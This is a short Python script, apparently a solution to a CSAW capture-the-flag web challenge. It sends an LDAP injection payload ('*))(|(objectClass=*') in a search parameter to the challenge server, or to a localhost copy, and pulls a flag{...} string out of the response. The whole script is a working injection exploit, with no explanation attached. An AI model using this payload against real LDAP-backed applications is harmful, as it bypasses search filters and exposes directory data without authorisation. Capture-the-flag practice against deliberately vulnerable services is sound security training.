#!/usr/bin/python
import re
import requests

# api-endpoint
URL = "http://web.chal.csaw.io:8080/index.php"
URL = "http://localhost:8080/index.php"


PARAMS = {'search':"*))(|(objectClass=*"}


r = requests.get(url = URL, params = PARAMS)
contents = r.text

flag = re.search("flag{.*}", str(contents))[0]


print(flag)
